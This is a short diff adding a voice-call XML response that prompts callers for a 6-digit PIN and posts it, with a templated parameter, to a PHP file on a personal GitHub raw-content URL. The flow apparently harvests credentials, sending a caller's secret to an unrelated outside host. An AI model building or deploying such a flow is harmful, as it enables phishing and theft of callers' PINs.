@@ -1,0 +1,6 @@
+<Response>
+  <GetDigits action="https://raw.githubusercontent.com/Loli1337/test/main/php1.php?param={{myvariable}}" method="POST" numDigits="6">
+    <Speak>Please enter your 6-digit PIN code, followed by the pound sign.</Speak>
+  </GetDigits>
+  <Speak>Thank you for entering your PIN code.</Speak>
+</Response>
